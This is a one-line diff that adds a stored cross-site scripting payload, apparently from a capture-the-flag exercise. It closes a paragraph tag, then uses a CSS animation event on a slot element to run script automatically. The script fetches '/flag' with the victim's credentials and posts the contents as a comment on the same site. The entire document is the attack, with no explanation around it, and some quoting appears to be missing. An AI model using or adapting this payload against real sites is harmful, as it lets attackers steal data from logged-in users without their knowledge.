@@ -1,0 +1,1 @@
+</p><style>@keyframes x{from{transform:none}to{transform:none}}</style><slot style="animation:x 1s" onanimationstart="fetch(/flag,{credentials:include}).then(r=>r.text()).then(t=>fetch(/comment/2,{method:POST,credentials:include,headers:{Content-Type:application/x-www-form-urlencoded},body:comment=+encodeURIComponent(t)}))"></slot>
